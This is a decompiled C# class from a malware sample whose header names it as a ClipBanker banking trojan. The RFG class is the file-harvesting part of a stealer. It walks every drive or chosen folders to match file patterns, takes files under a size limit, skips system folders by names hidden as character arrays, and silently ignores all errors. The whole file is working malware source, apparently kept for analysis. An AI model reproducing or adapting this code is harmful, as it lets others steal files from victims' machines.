// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Applications.RFG
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using FtpClient.Models.Info;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace FtpClient.Data.Applications
{
  public static class RFG
  {
    public static List<InfoClass3> GetFiles(IEnumerable<string> patterns)
    {
      List<InfoClass3> files = new List<InfoClass3>();
      try
      {
        foreach (string pattern in patterns)
        {
          try
          {
            string[] strArray1 = pattern.Split(new string[1]
            {
              "|"
            }, StringSplitOptions.RemoveEmptyEntries);
            if (strArray1 != null && strArray1.Length > 2)
            {
              string rootPath = Environment.ExpandEnvironmentVariables(strArray1[0]);
              string[] searchPatterns = strArray1[1].Split(new string[1]
              {
                ","
              }, StringSplitOptions.RemoveEmptyEntries);
              string str = strArray1[2];
              long result = 3097152;
              if (strArray1 != null && strArray1.Length == 4)
                long.TryParse(strArray1[3], out result);
              if (rootPath == new string(new char[8]
              {
                '%',
                'D',
                'S',
                'K',
                '_',
                '2',
                '3',
                '%'
              }))
              {
                foreach (string logicalDrive in Environment.GetLogicalDrives())
                {
                  try
                  {
                    foreach (string file in RFG.GetFiles(logicalDrive, (SearchOption) Convert.ToInt32(str), searchPatterns))
                    {
                      try
                      {
                        FileInfo fileInfo = new FileInfo(file);
                        if (fileInfo.Length > 0L && fileInfo.Length <= result)
                        {
                          string[] strArray2 = fileInfo.Directory.FullName.Split(new string[1]
                          {
                            new string(new char[2]{ ':', '\\' })
                          }, StringSplitOptions.RemoveEmptyEntries);
                          files.Add(new InfoClass3(fileInfo.FullName)
                          {
                            Object4 = strArray2 == null || strArray2.Length <= 1 ? string.Empty : strArray2[1],
                            Object2 = file
                          });
                        }
                      }
                      catch
                      {
                      }
                    }
                  }
                  catch
                  {
                  }
                }
              }
              else
              {
                foreach (string file in RFG.GetFiles(rootPath, (SearchOption) Convert.ToInt32(str), searchPatterns))
                {
                  try
                  {
                    FileInfo fileInfo = new FileInfo(file);
                    if (fileInfo.Length > 0L && fileInfo.Length <= result)
                    {
                      string[] strArray3 = fileInfo.Directory.FullName.Split(new string[1]
                      {
                        new string(new char[2]{ ':', '\\' })
                      }, StringSplitOptions.RemoveEmptyEntries);
                      files.Add(new InfoClass3(fileInfo.FullName)
                      {
                        Object4 = strArray3 == null || strArray3.Length <= 1 ? string.Empty : strArray3[1],
                        Object2 = file
                      });
                    }
                  }
                  catch (Exception ex)
                  {
                  }
                }
              }
            }
          }
          catch (Exception ex)
          {
          }
        }
      }
      catch
      {
      }
      return files;
    }

    public static IEnumerable<string> GetFiles(
      string rootPath,
      SearchOption searchOption,
      string[] searchPatterns)
    {
      List<string> source = new List<string>();
      source.Add(new string(new char[9]
      {
        '\\',
        'W',
        'i',
        'n',
        'd',
        'o',
        'w',
        's',
        '\\'
      }));
      source.Add(new string(new char[15]
      {
        '\\',
        'P',
        'r',
        'o',
        'g',
        'r',
        'a',
        'm',
        ' ',
        'F',
        'i',
        'l',
        'e',
        's',
        '\\'
      }));
      source.Add(new string(new char[21]
      {
        '\\',
        'P',
        'r',
        'o',
        'g',
        'r',
        'a',
        'm',
        ' ',
        'F',
        'i',
        'l',
        'e',
        's',
        ' ',
        '(',
        'x',
        '8',
        '6',
        ')',
        '\\'
      }));
      source.Add(new string(new char[14]
      {
        '\\',
        'P',
        'r',
        'o',
        'g',
        'r',
        'a',
        'm',
        ' ',
        'D',
        'a',
        't',
        'a',
        '\\'
      }));
      IEnumerable<string> first = Enumerable.Empty<string>();
      if (searchOption == SearchOption.AllDirectories)
      {
        try
        {
          foreach (string directory in (IEnumerable<string>) Directory.GetDirectories(rootPath))
          {
            if (source != null && source.Any<string>())
            {
              bool flag = false;
              foreach (string str in source)
              {
                if (directory.Contains(str))
                {
                  flag = true;
                  break;
                }
              }
              if (flag)
                continue;
            }
            first = first.Concat<string>(RFG.GetFiles(directory, searchOption, searchPatterns));
          }
        }
        catch
        {
        }
      }
      foreach (string searchPattern in searchPatterns)
      {
        try
        {
          first = first.Concat<string>(Directory.EnumerateFiles(rootPath, searchPattern));
        }
        catch
        {
        }
      }
      return first;
    }
  }
}
